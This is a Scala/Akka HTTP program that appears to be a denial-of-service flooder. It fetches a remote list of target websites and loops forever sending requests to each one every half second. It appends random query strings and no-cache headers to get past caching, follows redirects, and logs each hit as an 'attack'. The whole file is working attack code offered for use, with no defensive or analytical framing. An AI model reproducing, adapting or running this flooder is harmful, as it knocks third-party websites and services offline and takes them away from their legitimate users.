package hi

import akka.actor.ActorSystem
import akka.http.javadsl.model.headers.RawHeader
import akka.http.scaladsl.{ClientTransport, Http}
import akka.http.scaladsl.model.{headers, _}
import akka.http.scaladsl.model.headers.RawHeader
import akka.http.scaladsl.settings.ConnectionPoolSettings
import spray.json.DefaultJsonProtocol._
import spray.json._

import java.net.InetSocketAddress
import scala.concurrent.{ExecutionContextExecutor, Future}
import scala.io.Source
import scala.util.Random

object Test {
  //val file = Source.fromFile("urls.txt").getLines.toList
  //val file = Source.fromURL("https://raw.githubusercontent.com/david-l-books/storage/main/urls.txt").getLines.toList

  case class Proxy(id: Int, ip: String, auth: String) {
    def getIp: String = ip.replace("\r", "").split(":").head

    def port: String = ip.replace("\r", "").split(":")(1)

    def login: String = auth.split(":").head

    def password: String = auth.split(":")(1)
  }

  val random = new Random()

  case class Target(page: String)
  //case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)

  implicit val proxyFormat: RootJsonFormat[Proxy] = jsonFormat3(Proxy)

  implicit object TargetJsonFormat extends RootJsonFormat[Target] {
/*    override def read(json: JsValue): Target = {
      json.asJsObject.getFields("id", "url", "need_parse_url", "page", "page_time", "atack") match {
        case Seq(JsNumber(id), JsString(url), JsNumber(need_parse_url), JsString(page), page_time, JsNumber(atack)) =>
          Target(id.toInt, url, need_parse_url.toInt, page, page_time.toString(), atack.toInt)
      }
    }*/

    override def read(json: JsValue): Target = {
      json.asJsObject.getFields("page") match {
        case Seq(JsString(page)) =>
          Target(page)
      }
    }

    override def write(obj: Target): JsValue = {
      JsString("")
    }
  }

  def fetchTargets(implicit fmt: RootJsonFormat[Target]): Seq[String] = {
    //val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json")
    val source = scala.io.Source.fromURL("https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json")
    try {
      source.mkString.parseJson.convertTo[Seq[Target]].map(_.page)
    } finally {
      source.close()
    }
  }

  def fetchProxies: (String, Int) = {
    val source = Source.fromFile("proxy_socks_ip.txt")
    try {
      val list = source.getLines.toList
      val res = list(random.nextInt(list.size)).split(":")
      (res.head, res(1).toInt)
    } finally {
      source.close()
    }
  }

  def randomQueryParam(url: String): String = {
    val queryParam = Random.alphanumeric.take(10).mkString + "=" + Random.alphanumeric.take(12).mkString
    if (url.contains("?")) url + "&" + queryParam else url + "?" + queryParam
  }

  val REFRESH_TIME: Int = 10 * 60 * 1000

  var file: Seq[String] = fetchTargets

  var lastUpdate: Long = System.currentTimeMillis()

  def main(args: Array[String]): Unit = {
    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    while (true) {

      if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
        file = fetchTargets
        println(s"list updated. size=${file.size}")
        lastUpdate = System.currentTimeMillis()
      }

      println(s"Атакую групу ${file.mkString("[", ", ", "]")}")

      file.foreach {
        url =>
          innerRequest(url, false)
      }
      Thread.sleep(500)
    }
  }

  private def getProxy(system: ActorSystem): ConnectionPoolSettings = {
    val proxy = fetchProxies
    val proxyConfig = Option(ProxyConfig(proxy._1, proxy._2))
    val clientTransport =
      proxyConfig.map(p => ClientTransport.httpsProxy(InetSocketAddress.createUnresolved(p.host, p.port)))
        .getOrElse(ClientTransport.TCP)

    ConnectionPoolSettings(system).withTransport(clientTransport)
  }

  case class ProxyConfig(host: String, port: Int)

  private def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
    val str = randomQueryParam(url)

    Http().singleRequest(HttpRequest(uri = str).withHeaders(headers.RawHeader("Cache-Control", "no-cache"), headers.RawHeader("Connection", "keep-alive"))).flatMap {
      case HttpResponse(StatusCodes.OK, _, _, _) =>
        Future.successful {
          if (!recursion) {
            println(s"attack $str")
          } else {
            println(s"attack after redirect $str")
          }
        }
      case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
        Future.successful {
          if (recursion) {
            println(s"too many redirects $url")
          } else {
            val link = headers.filter(ss => ss.name().equals("Location"))

            if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != str) {
              innerRequest(link.head.value(), true)
            } else {
              println(s"error redirect $url")
            }
          }
        }

      case HttpResponse(StatusCodes.Forbidden, headers, _, _) =>
        Future.successful(println(s"403"))
      case err =>
        sys.error(s"server is not responding: $err")
    }
  }
}
